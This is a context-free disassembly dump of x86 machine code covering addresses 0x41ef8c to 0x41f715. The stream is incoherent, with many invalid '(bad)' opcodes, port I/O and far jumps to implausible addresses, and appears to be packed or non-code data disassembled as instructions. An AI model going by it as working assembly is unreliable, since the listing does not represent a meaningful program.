  41ef8c:	xchg   esi,eax
  41ef8d:	and    DWORD PTR [edx+0x22a8bad8],edi
  41ef93:	push   0x3
  41ef95:	pop    eax
  41ef96:	or     bh,BYTE PTR ds:0xb9ee9d1a
  41ef9c:	retf   
  41ef9d:	popa   
  41ef9e:	push   ds
  41ef9f:	cmp    ebp,DWORD PTR [ecx-0x5e]
  41efa2:	mov    bh,0x76
  41efa4:	das    
  41efa5:	sbb    DWORD PTR [edx-0x3bfdd64],0xffffff83
  41efac:	in     eax,dx
  41efad:	cmp    BYTE PTR [ebx-0x5072c3d9],dh
  41efb3:	call   0x738a7207
  41efb8:	cs (bad) 
  41efba:	xchg   edx,eax
  41efbb:	mov    ebx,ds
  41efbd:	sbb    edx,DWORD PTR [ecx-0x11dd2d64]
  41efc3:	gs mov ebx,0x7acefd7
  41efc9:	and    ch,dh
  41efcb:	mov    esi,0x1189bb06
  41efd0:	ror    BYTE PTR [esi-0x25ca3b3c],1
  41efd6:	sub    eax,0x13fc7c45
  41efdb:	and    ch,ch
  41efdd:	adc    ebx,DWORD PTR [edi+0x1a]
  41efe0:	not    DWORD PTR [esi+0x7b]
  41efe3:	stc    
  41efe4:	mov    ebp,0x3d209fd7
  41efe9:	jle    0x41eff0
  41efeb:	stos   DWORD PTR es:[edi],eax
  41efec:	popa   
  41efed:	xchg   esp,eax
  41efee:	mov    dh,0x55
  41eff0:	lds    edi,FWORD PTR [edx-0x52eb0c72]
  41eff6:	or     BYTE PTR [edi+0x7d],bh
  41eff9:	sub    DWORD PTR [ebx],ebp
  41effb:	and    eax,0x26cd4528
  41f000:	mov    ecx,edi
  41f002:	pop    ebp
  41f003:	(bad)  
  41f004:	push   esp
  41f005:	pop    edi
  41f006:	pop    es
  41f007:	sti    
  41f008:	mov    ds:0x4022f993,al
  41f00d:	test   DWORD PTR [eax+edx*1-0x20],esi
  41f011:	jbe    0x41efce
  41f013:	pop    eax
  41f014:	enter  0xcea0,0xdc
  41f018:	sub    BYTE PTR ds:0x2d57c145,bh
  41f01e:	xchg   DWORD PTR [edi-0x1e2aa76],edi
  41f024:	or     ecx,DWORD PTR ds:0x1fb8afe1
  41f02a:	jb     0x41f096
  41f02c:	sbb    bl,BYTE PTR [eax]
  41f02e:	ins    DWORD PTR es:[edi],dx
  41f02f:	xor    eax,0x4ddcaa80
  41f034:	into   
  41f035:	sbb    al,0x5f
  41f037:	mov    ecx,0x17add68f
  41f03c:	mov    BYTE PTR [ecx+0x2d],ah
  41f03f:	stc    
  41f040:	ins    DWORD PTR es:[edi],dx
  41f041:	xchg   ecx,eax
  41f042:	lods   al,BYTE PTR ds:[esi]
  41f043:	and    ebp,DWORD PTR [ebx]
  41f045:	(bad)  
  41f046:	ffreep st(1)
  41f048:	fidivr WORD PTR [edi]
  41f04a:	and    DWORD PTR [ebp+0x724e61d9],0x91f32d75
  41f054:	mov    ebp,0xa749fbb6
  41f059:	dec    edi
  41f05a:	shl    DWORD PTR [edi+0x7d],cl
  41f05d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f05e:	inc    ebp
  41f05f:	mov    bl,0xb7
  41f061:	ins    DWORD PTR es:[edi],dx
  41f062:	and    DWORD PTR [edx+0x6c],edi
  41f065:	sub    edx,DWORD PTR [ebx]
  41f067:	add    BYTE PTR [ebp-0x59],ch
  41f06a:	nop
  41f06b:	or     DWORD PTR [eax+0x8],edi
  41f06e:	ins    DWORD PTR es:[edi],dx
  41f06f:	jmp    0x41f05b
  41f071:	test   BYTE PTR [eax-0x1f],cl
  41f074:	jp     0x41f072
  41f076:	inc    edx
  41f077:	mov    bh,0x90
  41f079:	in     al,0x6e
  41f07b:	leave  
  41f07c:	xchg   ecx,eax
  41f07d:	(bad)  
  41f07e:	jmp    0x88f1:0xfab5284b
  41f085:	(bad)  
  41f087:	not    DWORD PTR [ebx]
  41f089:	adc    DWORD PTR [ebx+0x4b250a7],0x745eb8aa
  41f093:	sub    ebx,DWORD PTR [esi-0x600b8a76]
  41f099:	test   DWORD PTR [edi],0x499c2702
  41f09f:	jae    0x41f0dd
  41f0a1:	xchg   edx,eax
  41f0a2:	inc    edx
  41f0a3:	call   0x9dda05ce
  41f0a8:	xchg   ebp,eax
  41f0a9:	sar    BYTE PTR [ecx-0x63],0x48
  41f0ad:	mov    al,ds:0x55171a3f
  41f0b2:	pushf  
  41f0b3:	cmp    al,0x34
  41f0b5:	popa   
  41f0b6:	gs popa 
  41f0b8:	jns    0x41f082
  41f0ba:	rcr    dl,0x54
  41f0bd:	add    al,0x7
  41f0bf:	xlat   BYTE PTR ds:[ebx]
  41f0c0:	call   0x9f8d9a9
  41f0c5:	add    BYTE PTR [esi+0x4703dc19],bh
  41f0cb:	jbe    0x41f051
  41f0cd:	clc    
  41f0ce:	mov    ecx,0xfdbe14fa
  41f0d3:	(bad)  
  41f0d4:	jmp    0x1ec2c43e
  41f0d9:	out    0x87,al
  41f0db:	mov    eax,ds:0x798610ad
  41f0e0:	push   ebx
  41f0e1:	jns    0x41f072
  41f0e3:	pop    ebx
  41f0e4:	pop    edx
  41f0e5:	xor    eax,edi
  41f0e7:	mov    ebx,0xf6e47898
  41f0ec:	adc    al,0x2f
  41f0ee:	fwait
  41f0ef:	mov    bh,0x69
  41f0f1:	ss (bad) 
  41f0f3:	rcr    DWORD PTR [ebp+0x37],cl
  41f0f6:	push   ss
  41f0f7:	pop    edx
  41f0f8:	jno    0x41f13f
  41f0fa:	push   esp
  41f0fb:	lods   eax,DWORD PTR ds:[esi]
  41f0fc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f0fd:	pusha  
  41f0fe:	(bad)  
  41f0ff:	xchg   esp,eax
  41f100:	mov    al,0x83
  41f102:	mul    eax
  41f104:	fldcw  WORD PTR [ebp+0x68379df8]
  41f10a:	(bad)  
  41f10b:	jmp    0xe6f18c29
  41f110:	idiv   DWORD PTR [edi+0x260bb707]
  41f116:	arpl   WORD PTR [edx-0x4a],bx
  41f119:	loop   0x41f0c6
  41f11b:	outs   dx,DWORD PTR ds:[esi]
  41f11c:	(bad)  
  41f11d:	call   0x7c27e760
  41f122:	sub    DWORD PTR [esi],esp
  41f124:	cld    
  41f125:	cmp    BYTE PTR [ebx-0x20],dh
  41f128:	sbb    ebp,esp
  41f12a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f12b:	sbb    eax,0x4912ef23
  41f130:	push   ebx
  41f131:	mov    ds:0xd454d19f,al
  41f136:	js     0x41f145
  41f138:	iret   
  41f139:	xchg   ecx,eax
  41f13a:	pop    ss
  41f13b:	dec    esi
  41f13c:	mov    al,ds:0x30671c6c
  41f141:	adc    edi,esp
  41f143:	mov    eax,ds:0xeeff741f
  41f148:	test   DWORD PTR [eax+ebx*1],ebx
  41f14b:	jae    0x41f16f
  41f14d:	imul   ebx,DWORD PTR [eax],0x70
  41f150:	leave  
  41f151:	xor    DWORD PTR [edx],ebp
  41f153:	mov    edi,0x5823c6c3
  41f158:	mov    ebp,0x8b2d5819
  41f15d:	shr    BYTE PTR [edi-0x315169b3],0x22
  41f164:	call   0x2a7b:0xe27f82c1
  41f16b:	nop
  41f16c:	sar    BYTE PTR [ebx],cl
  41f16e:	out    0x98,eax
  41f170:	loope  0x41f110
  41f172:	pop    eax
  41f173:	leave  
  41f174:	cmp    al,BYTE PTR [edx-0x22]
  41f177:	inc    eax
  41f178:	aaa    
  41f179:	dec    ebp
  41f17a:	repz lahf 
  41f17c:	fistp  WORD PTR [ebp-0x57]
  41f17f:	bound  ebx,QWORD PTR [edi+ebp*2]
  41f182:	sbb    DWORD PTR [eax],ebp
  41f184:	mov    esp,0x621871c5
  41f189:	lock fcomp QWORD PTR [edx-0x7d]
  41f18d:	jb     0x41f141
  41f18f:	add    DWORD PTR [esp+edi*4-0x59cc0181],ecx
  41f196:	sub    BYTE PTR [ebx+0x4d73b70],ah
  41f19c:	mov    ds:0x9d8d13a2,al
  41f1a1:	sbb    eax,0x7396cc14
  41f1a6:	adc    ebp,DWORD PTR [edi+0x4db5500d]
  41f1ac:	rep ins BYTE PTR es:[edi],dx
  41f1ae:	ins    DWORD PTR es:[edi],dx
  41f1af:	dec    edx
  41f1b0:	(bad)  
  41f1b1:	lahf   
  41f1b2:	jle    0x41f19f
  41f1b4:	jp     0x41f1f6
  41f1b6:	cmp    eax,0xfa6c4a8d
  41f1bb:	test   BYTE PTR [eax],0x45
  41f1be:	cmp    DWORD PTR [ecx],edx
  41f1c0:	mov    DWORD PTR [edi+0xe],0x298dfae
  41f1c7:	pop    es
  41f1c8:	jge    0x41f1eb
  41f1ca:	leave  
  41f1cb:	push   ecx
  41f1cc:	ds add al,0xdc
  41f1cf:	(bad)  
  41f1d0:	or     DWORD PTR [edi],edi
  41f1d2:	xlat   BYTE PTR ds:[ebx]
  41f1d3:	inc    edi
  41f1d4:	test   DWORD PTR [edx+esi*2-0x3d1086e6],ebx
  41f1db:	imul   edx,DWORD PTR [ebx],0xffffff91
  41f1de:	cwde   
  41f1df:	or     BYTE PTR ds:0x2786dce9,ah
  41f1e5:	nop
  41f1e6:	aam    0x33
  41f1e8:	stc    
  41f1e9:	aaa    
  41f1ea:	ds sahf 
  41f1ec:	out    0x63,eax
  41f1ee:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f1ef:	jp     0x41f23e
  41f1f1:	daa    
  41f1f2:	les    ebp,FWORD PTR [edi]
  41f1f4:	jge    0x41f21e
  41f1f6:	pop    esp
  41f1f8:	jle    0x41f219
  41f1fa:	dec    eax
  41f1fb:	mov    ebx,esi
  41f1fd:	js     0x41f227
  41f1ff:	mov    dh,0xad
  41f201:	push   ds
  41f202:	adc    al,0x49
  41f204:	lahf   
  41f205:	mov    ebx,0xb3235cf3
  41f20a:	mov    ch,0xc8
  41f20c:	divps  xmm0,XMMWORD PTR ds:0xbfe26149
  41f213:	retf   0xa4f0
  41f216:	xchg   esp,eax
  41f217:	inc    eax
  41f218:	mov    eax,0x318ba34a
  41f21d:	aam    0xcb
  41f21f:	xor    ch,ch
  41f221:	and    eax,0xe3af7364
  41f226:	test   DWORD PTR [edx],esi
  41f228:	jbe    0x41f1b5
  41f22a:	and    DWORD PTR [esi],esp
  41f22c:	mov    ebp,0x3b06d199
  41f231:	add    eax,esi
  41f233:	lods   eax,DWORD PTR ds:[esi]
  41f234:	neg    BYTE PTR [eax+0x1d]
  41f237:	and    ecx,DWORD PTR [edx]
  41f239:	scas   al,BYTE PTR es:[edi]
  41f23a:	xchg   edx,eax
  41f23b:	loopne 0x41f292
  41f23d:	ins    BYTE PTR es:[edi],dx
  41f23e:	mov    al,0xad
  41f240:	pop    eax
  41f241:	jmp    0x41f27e
  41f243:	sub    bh,ah
  41f245:	xchg   edx,eax
  41f246:	xor    eax,0x3a9d4ef1
  41f24b:	mov    edx,0x96c4575f
  41f250:	aaa    
  41f251:	xor    DWORD PTR [ecx-0x61],0x28650d07
  41f258:	add    ebx,DWORD PTR [ecx-0x15]
  41f25b:	cli    
  41f25c:	test   DWORD PTR [eax-0xb9f4d98],esp
  41f262:	sbb    BYTE PTR [edi],al
  41f264:	call   0x2b57:0x4e377860
  41f26b:	icebp  
  41f26c:	aam    0x44
  41f26e:	push   cs
  41f26f:	pop    es
  41f270:	lahf   
  41f271:	jbe    0x41f20d
  41f273:	cmp    ch,0x91
  41f276:	sbb    esp,DWORD PTR [esi-0xb]
  41f279:	push   0xc1957b8a
  41f27e:	dec    eax
  41f27f:	rcpps  xmm1,XMMWORD PTR ds:0xf68d8e67
  41f286:	dec    ebx
  41f287:	jle    0x41f273
  41f289:	push   es
  41f28a:	lea    ebx,[eax-0x1bd752d]
  41f290:	leave  
  41f291:	dec    esp
  41f292:	cld    
  41f293:	cmp    al,0xe2
  41f295:	outs   dx,DWORD PTR ds:[esi]
  41f296:	xchg   ebp,eax
  41f297:	pop    ds
  41f298:	test   BYTE PTR [esi],bl
  41f29a:	(bad)  
  41f29b:	jb     0x41f278
  41f29d:	sahf   
  41f29e:	hlt    
  41f29f:	sub    eax,ecx
  41f2a1:	loop   0x41f267
  41f2a3:	lock and eax,0xd6203196
  41f2a9:	cmp    DWORD PTR [edi+eax*2+0x63abeb1],esp
  41f2b0:	mov    ebx,0x48e3549d
  41f2b5:	clc    
  41f2b6:	imul   edi,DWORD PTR [ecx+0x58b96932],0xf4332fb6
  41f2c0:	sbb    eax,0x424346a8
  41f2c5:	push   edi
  41f2c6:	or     edx,DWORD PTR [ebp-0x39]
  41f2c9:	push   eax
  41f2ca:	jnp    0x41f268
  41f2cc:	les    eax,FWORD PTR [esi+0x2c]
  41f2cf:	call   DWORD PTR [ebx-0x68]
  41f2d2:	or     eax,0xf62da827
  41f2d7:	jne    0x41f263
  41f2d9:	mov    ebx,0x7cbef2d3
  41f2de:	enter  0xcf53,0xc3
  41f2e2:	sub    ebx,DWORD PTR [esi-0x6e]
  41f2e5:	fisub  DWORD PTR [esi+edx*4]
  41f2e8:	retf   0xd318
  41f2eb:	dec    edi
  41f2ec:	xchg   ecx,eax
  41f2ed:	lock test eax,0xb8c00841
  41f2f3:	out    dx,eax
  41f2f4:	sar    DWORD PTR [ebx],0x3f
  41f2f7:	inc    esi
  41f2f8:	pop    edi
  41f2f9:	jl     0x41f368
  41f2fb:	inc    eax
  41f2fc:	(bad)
  41f300:	(bad)  
  41f301:	adc    eax,esi
  41f303:	xchg   ebp,eax
  41f304:	mov    DWORD PTR [ebx+0x38],eax
  41f307:	lods   al,BYTE PTR ds:[esi]
  41f308:	or     BYTE PTR [edx-0x5e],cl
  41f30b:	retf   0x7c29
  41f30e:	and    dl,BYTE PTR [edx+eax*2+0xa]
  41f312:	mov    DWORD PTR ds:0xd4b8a955,edx
  41f318:	adc    DWORD PTR [esi],0xffffffd5
  41f31b:	shr    BYTE PTR [ebx+0xa],1
  41f31e:	push   ss
  41f31f:	sti    
  41f320:	enter  0x37f8,0xcb
  41f324:	mov    esi,0xf5b99b12
  41f329:	test   eax,0x27de61a9
  41f32e:	aad    0x31
  41f330:	ret    0x87e6
  41f333:	stos   DWORD PTR es:[edi],eax
  41f334:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f335:	xor    DWORD PTR [edi],esp
  41f337:	pop    ecx
  41f338:	jg     0x41f30f
  41f33a:	cmp    esp,DWORD PTR [edx]
  41f33c:	ins    BYTE PTR es:[edi],dx
  41f33d:	sub    al,0x71
  41f33f:	jg     0x41f308
  41f341:	popa   
  41f342:	mov    al,0x71
  41f344:	iret   
  41f345:	hlt    
  41f346:	mov    dl,0x3e
  41f348:	ret    
  41f349:	sub    al,0x1
  41f34b:	pop    ecx
  41f34c:	fst    QWORD PTR [esi]
  41f34e:	inc    esp
  41f34f:	push   ss
  41f350:	add    eax,0xa68d09ed
  41f355:	mov    BYTE PTR [ecx+0x13],dl
  41f358:	inc    DWORD PTR [edx-0x76a16af1]
  41f35e:	jge    0x41f2e3
  41f360:	jge    0x41f393
  41f362:	push   edx
  41f363:	(bad)  
  41f365:	(bad)  
  41f366:	xor    ch,al
  41f368:	in     eax,0x8e
  41f36a:	test   ecx,esp
  41f36c:	(bad)  
  41f36d:	iret   
  41f36e:	aam    0x80
  41f370:	jno    0x41f340
  41f372:	xchg   ecx,eax
  41f373:	mov    ebx,0x5f6bd3e6
  41f378:	clc    
  41f379:	inc    edx
  41f37a:	les    eax,FWORD PTR [esi]
  41f37c:	ins    BYTE PTR es:[edi],dx
  41f37d:	hlt    
  41f37e:	imul   DWORD PTR [ebp+eiz*8+0x31]
  41f382:	jle    0x41f3f1
  41f384:	mov    edi,0x6c2453fc
  41f389:	sbb    edi,DWORD PTR [ecx+0x7c]
  41f38c:	jns    0x41f401
  41f38e:	hlt    
  41f38f:	add    eax,0x18036d5f
  41f394:	and    edi,ebx
  41f396:	sbb    eax,0xc87b0c3e
  41f39b:	mov    al,ds:0xbdfdfd49
  41f3a0:	add    eax,0x41740aa3
  41f3a5:	or     al,0x18
  41f3a7:	jl     0x41f335
  41f3a9:	iret   
  41f3aa:	in     al,dx
  41f3ab:	loopne 0x41f3a0
  41f3ad:	add    DWORD PTR [eax+0x7a9b5852],edx
  41f3b3:	sbb    al,0x96
  41f3b5:	add    al,0xde
  41f3b7:	adc    eax,0xc53f7c3c
  41f3bc:	mov    edx,0x4a7e3a1c
  41f3c1:	fld    DWORD PTR [esi+0x5e]
  41f3c4:	(bad)  
  41f3c5:	rcr    ah,cl
  41f3c7:	xbegin 0xbd7714c0
  41f3cd:	ret    
  41f3ce:	add    eax,0xdf435eb4
  41f3d3:	xor    DWORD PTR [ecx+eax*4+0x63],edi
  41f3d7:	cmp    BYTE PTR [esp+edx*8-0x53],ch
  41f3db:	mov    al,0x93
  41f3dd:	lods   al,BYTE PTR ds:[esi]
  41f3de:	in     eax,dx
  41f3df:	xchg   DWORD PTR [edx],ebp
  41f3e1:	or     esp,0x5fa9efe0
  41f3e7:	push   es
  41f3e8:	push   ebp
  41f3e9:	xchg   ebp,eax
  41f3ea:	xchg   esp,eax
  41f3eb:	scas   al,BYTE PTR es:[edi]
  41f3ec:	cmp    bl,dl
  41f3ee:	xchg   esi,eax
  41f3ef:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f3f0:	add    al,0xb1
  41f3f2:	addr16 (bad) 
  41f3f4:	and    dh,BYTE PTR [edi-0x53]
  41f3f7:	dec    ebp
  41f3f8:	shl    ax,cl
  41f3fb:	cmp    edi,eax
  41f3fd:	lahf   
  41f3fe:	int3   
  41f3ff:	gs push edi
  41f401:	sbb    DWORD PTR ds:0xe63bff24,ecx
  41f407:	cli    
  41f408:	or     dl,BYTE PTR [ebp-0x8]
  41f40b:	imul   esp,DWORD PTR [edx-0x593ce5a9],0x65868bed
  41f415:	adc    ah,BYTE PTR [edi+0x71]
  41f418:	pop    es
  41f419:	mov    ebp,0x9a064074
  41f41e:	sbb    DWORD PTR [ecx+0x3d],ecx
  41f421:	nop
  41f422:	in     al,0x27
  41f424:	sbb    eax,DWORD PTR [ecx+0x72206fd9]
  41f42a:	out    0xce,al
  41f42c:	cmp    bl,ah
  41f42e:	lods   al,BYTE PTR ds:[esi]
  41f42f:	lar    esi,dx
  41f432:	inc    esp
  41f433:	cld    
  41f434:	ins    DWORD PTR es:[edi],dx
  41f435:	out    0x33,al
  41f437:	adc    eax,0x692b6727
  41f43c:	jne    0x41f46a
  41f43e:	push   ss
  41f43f:	shr    edx,cl
  41f441:	and    edx,esp
  41f443:	int3   
  41f444:	(bad)  
  41f445:	xor    ecx,DWORD PTR [eax-0x70]
  41f448:	mov    ds:0x340d07b5,eax
  41f44d:	pop    ecx
  41f44e:	mov    BYTE PTR [eax+0x15d80c57],dl
  41f454:	aam    0xf
  41f456:	imul   ecx,esp,0x77597ed2
  41f45c:	xchg   edx,eax
  41f45d:	mov    edx,esi
  41f45f:	mov    ebx,0x6163681d
  41f464:	test   al,0xcc
  41f466:	ficom  WORD PTR [eax+0x35749332]
  41f46c:	fild   WORD PTR [ebp-0x43372021]
  41f472:	aad    0x9a
  41f474:	jge    0x41f436
  41f476:	sti    
  41f477:	hlt    
  41f478:	mov    edx,0x3bc473db
  41f47d:	aaa    
  41f47e:	add    DWORD PTR [ebx-0x3e007509],0x3
  41f485:	push   ds
  41f486:	and    eax,0x695dd8c1
  41f48b:	lds    esp,FWORD PTR [ecx]
  41f48d:	in     eax,dx
  41f48e:	push   edx
  41f48f:	dec    ebx
  41f490:	adc    al,0xce
  41f492:	out    0xd3,eax
  41f494:	shr    BYTE PTR [ebx],0x13
  41f497:	jae    0x41f45f
  41f499:	add    eax,0x78d1c2c3
  41f49e:	adc    cl,BYTE PTR [eax]
  41f4a0:	jl     0x41f44f
  41f4a2:	xchg   esp,eax
  41f4a3:	(bad)  
  41f4a5:	xor    edx,edx
  41f4a7:	pop    ds
  41f4a8:	sti    
  41f4a9:	mov    ch,0x70
  41f4ab:	in     eax,dx
  41f4ac:	mov    ebp,0xcfe9e0b1
  41f4b1:	scas   al,BYTE PTR es:[edi]
  41f4b2:	in     eax,0xf8
  41f4b4:	test   DWORD PTR [esi+0xe],0x28743adf
  41f4bb:	mov    al,BYTE PTR [ebx+0x2a]
  41f4be:	retf   0xa63d
  41f4c1:	js     0x41f4ff
  41f4c3:	pusha  
  41f4c4:	mov    edi,0xc8b4e227
  41f4c9:	adc    BYTE PTR [edx+0x9],cl
  41f4cc:	xor    ebp,DWORD PTR [ebx+0x7abf1b35]
  41f4d2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f4d3:	adc    cl,BYTE PTR [eax-0x7c2a291e]
  41f4d9:	in     eax,0x6a
  41f4db:	fnsave [esi]
  41f4dd:	cwde   
  41f4de:	adc    edi,DWORD PTR [edx-0xc]
  41f4e1:	pop    ebp
  41f4e2:	jne    0x41f501
  41f4e4:	ins    BYTE PTR es:[edi],dx
  41f4e5:	push   0x414e4e0
  41f4ea:	and    al,0x46
  41f4ec:	fstp   TBYTE PTR [esi+eiz*2]
  41f4ef:	add    eax,0xf7cebf64
  41f4f4:	inc    ecx
  41f4f5:	mov    edx,0x7be5d6b8
  41f4fa:	(bad)  
  41f4fb:	pop    ss
  41f4fc:	mov    edi,0x169de67b
  41f501:	mov    edi,0xed3f5244
  41f506:	pop    ds
  41f507:	xchg   esi,eax
  41f508:	or     eax,0x5cb516bd
  41f50d:	mov    eax,0x20fd1a0b
  41f512:	push   edx
  41f513:	mov    eax,ds:0x3b5e9353
  41f518:	fist   DWORD PTR [ecx+0x27]
  41f51b:	div    BYTE PTR [eax+eax*4-0x2b4a571b]
  41f522:	lods   al,BYTE PTR ds:[esi]
  41f524:	(bad)  
  41f526:	sbb    BYTE PTR [edi],bl
  41f528:	push   esp
  41f529:	lods   al,BYTE PTR ds:[esi]
  41f52a:	cmp    al,0x3a
  41f52c:	push   ebp
  41f52d:	sahf   
  41f52e:	in     al,dx
  41f52f:	and    DWORD PTR [ecx],ecx
  41f531:	fucomp st(3)
  41f533:	retf   0x614e
  41f536:	bound  ecx,QWORD PTR [edi+0x37a7dd54]
  41f53c:	dec    esp
  41f53d:	jmp    0x41955277
  41f542:	dec    ebp
  41f543:	sub    DWORD PTR [eax-0x7d],ebx
  41f546:	mov    eax,0x334f34c3
  41f54b:	shr    ebx,1
  41f54d:	dec    ecx
  41f54e:	xchg   esi,eax
  41f54f:	inc    esp
  41f550:	test   BYTE PTR [ecx],ch
  41f552:	lods   al,BYTE PTR ds:[esi]
  41f553:	mov    bh,0xee
  41f555:	sahf   
  41f556:	shl    DWORD PTR [eax+0x52eb60ce],1
  41f55c:	out    0xab,al
  41f55e:	ins    DWORD PTR es:[edi],dx
  41f55f:	icebp  
  41f560:	adc    BYTE PTR [edi],dh
  41f562:	push   es
  41f563:	test   edx,edx
  41f565:	push   eax
  41f566:	cmp    eax,0x6e7ab910
  41f56b:	push   ecx
  41f56c:	in     eax,dx
  41f56d:	push   esp
  41f56e:	jae    0x41f50c
  41f570:	sahf   
  41f571:	or     BYTE PTR [edi+esi*1],0x66
  41f575:	xrelease mov BYTE PTR [esi],al
  41f578:	rcr    DWORD PTR ds:0x22a4f991,0x18
  41f57f:	adc    ah,BYTE PTR [ecx+0x7cd89dc4]
  41f585:	mov    ebx,0x6cfbc8ff
  41f58a:	js     0x41f554
  41f58c:	(bad)  
  41f58d:	inc    ebx
  41f58e:	pop    ss
  41f58f:	in     eax,0xf4
  41f591:	add    eax,0x2c67dd40
  41f596:	lods   eax,DWORD PTR ds:[esi]
  41f597:	lds    ebp,FWORD PTR [ecx-0x62e64ac9]
  41f59d:	cmc    
  41f59e:	out    0x55,eax
  41f5a0:	inc    eax
  41f5a1:	pop    edi
  41f5a2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f5a3:	popa   
  41f5a4:	jb     0x41f57c
  41f5a6:	push   ebx
  41f5a7:	(bad)  
  41f5a8:	repnz fild WORD PTR [esi+0x5895a746]
  41f5af:	pop    ebp
  41f5b0:	xchg   ebp,eax
  41f5b1:	jp     0x41f557
  41f5b3:	fistp  QWORD PTR [esi+0xb]
  41f5b6:	in     al,dx
  41f5b7:	xor    BYTE PTR [ebp+0x28733832],ah
  41f5bd:	out    0xd0,eax
  41f5bf:	jae    0x41f634
  41f5c1:	push   ds
  41f5c2:	ins    BYTE PTR es:[edi],dx
  41f5c3:	lock daa 
  41f5c5:	push   ds
  41f5c6:	scas   al,BYTE PTR es:[edi]
  41f5c7:	ins    DWORD PTR es:[edi],dx
  41f5c8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f5c9:	inc    eax
  41f5ca:	mov    esi,0x4cc41204
  41f5cf:	xchg   DWORD PTR ss:[ebx+0x61ad8025],edi
  41f5d6:	jmp    0x41f5a1
  41f5d8:	sbb    eax,0x4d483a54
  41f5dd:	jl     0x41f572
  41f5df:	push   ebp
  41f5e0:	cmp    BYTE PTR [ebx+0x3a],cl
  41f5e3:	mov    fs,WORD PTR [ebp-0x14a1cc93]
  41f5e9:	(bad)  
  41f5ea:	and    ax,0x3e96
  41f5ee:	sbb    bl,BYTE PTR ds:0x8774f22e
  41f5f4:	cmp    bl,ah
  41f5f6:	xchg   edx,eax
  41f5f7:	push   0xffffffde
  41f5f9:	add    esi,0x0
  41f5fc:	xchg   edi,eax
  41f5fd:	inc    ebx
  41f5fe:	es jmp 0x5efb7495
  41f604:	mov    ebx,0xdeb3628a
  41f609:	lahf   
  41f60a:	js     0x41f637
  41f60c:	xchg   DWORD PTR [edi],edx
  41f60e:	inc    esp
  41f60f:	ins    DWORD PTR es:[edi],dx
  41f610:	or     dh,ah
  41f612:	mov    ecx,0x9bb622c7
  41f617:	(bad)  
  41f618:	enter  0xae6f,0xde
  41f61c:	sbb    eax,0xe85b9a69
  41f621:	ret    
  41f622:	jae    0x41f657
  41f624:	push   esp
  41f625:	pop    ebp
  41f626:	leave  
  41f627:	add    BYTE PTR [ecx-0x7f],al
  41f62a:	js     0x41f5ef
  41f62c:	das    
  41f62d:	mov    al,es:0xa6ce58ab
  41f633:	or     al,0x40
  41f635:	push   edx
  41f636:	pop    ebx
  41f637:	xchg   ebx,eax
  41f638:	or     DWORD PTR [edx],0x5f
  41f63b:	mov    eax,0x4c7a7443
  41f640:	jne    0x41f5e3
  41f642:	and    BYTE PTR [edx+0x3aad1439],bh
  41f648:	jp     0x41f674
  41f64a:	mov    WORD PTR [edx-0x28],fs
  41f64d:	xor    cl,BYTE PTR [ebx-0x7]
  41f650:	call   0xc6f2538e
  41f655:	lock fadd QWORD PTR [edi-0x69]
  41f659:	inc    BYTE PTR [ebx-0x51]
  41f65c:	fimul  WORD PTR [ecx-0x615a92a2]
  41f662:	call   0xc983a5a0
  41f667:	dec    eax
  41f668:	sub    DWORD PTR [eax-0x6adedf9a],ebp
  41f66e:	retf   
  41f66f:	in     al,0x36
  41f671:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f672:	dec    eax
  41f673:	and    DWORD PTR [eax],ebx
  41f675:	mov    bl,0x22
  41f677:	push   0x6a
  41f679:	mov    ecx,DWORD PTR [eax-0x21]
  41f67c:	pop    esi
  41f67d:	popf   
  41f67e:	inc    esi
  41f67f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f680:	arpl   WORD PTR [edi-0x25c774a4],cx
  41f686:	jmp    0x8fc4:0xda86448
  41f68d:	std    
  41f68e:	inc    edi
  41f68f:	pop    ebp
  41f690:	scas   al,BYTE PTR es:[edi]
  41f691:	push   ds
  41f692:	sbb    bh,BYTE PTR [ebx-0x34]
  41f695:	sub    ebx,DWORD PTR [esi+0xa9e0a6d]
  41f69b:	xchg   edi,eax
  41f69c:	scas   al,BYTE PTR es:[edi]
  41f69d:	xchg   esp,eax
  41f69e:	mov    edx,0xfe815a5e
  41f6a3:	ret    0x9e2e
  41f6a6:	stos   BYTE PTR es:[edi],al
  41f6a7:	cdq    
  41f6a8:	push   edi
  41f6a9:	test   DWORD PTR ds:0x75b4e7e1,eax
  41f6af:	add    ebx,DWORD PTR [ebx+0x53e38e87]
  41f6b5:	and    eax,0xedd97f7d
  41f6ba:	daa    
  41f6bb:	out    dx,eax
  41f6bc:	push   ds
  41f6bd:	sub    al,0x5e
  41f6bf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f6c0:	jo     0x41f686
  41f6c2:	cmp    BYTE PTR [ebx-0xb2dfcff],0xbf
  41f6c9:	sbb    edx,DWORD PTR [eax-0x32]
  41f6cc:	xlat   BYTE PTR ds:[ebx]
  41f6cd:	sub    BYTE PTR [ebx+0x7bc4a721],0xe
  41f6d4:	mov    dl,0xf6
  41f6d6:	cmp    al,0x34
  41f6d8:	push   eax
  41f6d9:	cmp    ebp,edx
  41f6db:	adc    edx,DWORD PTR [ebx]
  41f6dd:	jmp    0x41f74c
  41f6df:	mov    bh,0x99
  41f6e1:	mov    es,WORD PTR [ebx+0x7e617866]
  41f6e7:	ficomp DWORD PTR [edi-0x38]
  41f6ea:	mov    al,ds:0x5e1a72f2
  41f6ef:	mov    bl,0x68
  41f6f1:	push   ds
  41f6f2:	into   
  41f6f3:	popa   
  41f6f4:	xchg   ebx,eax
  41f6f5:	pop    ss
  41f6f6:	out    dx,eax
  41f6f7:	or     eax,0xbfd75423
  41f6fc:	test   eax,0xa17bbb31
  41f701:	gs je  0x41f6d9
  41f704:	cwde   
  41f705:	jmp    0x41f6c4
  41f707:	sbb    DWORD PTR [esi-0x2a],eax
  41f70a:	repnz or esi,eax
  41f70d:	retf   0x290b
  41f710:	retf   0x5e05
  41f713:	out    0xf9,eax
  41f715:	fmul   QWORD PTR [esi]
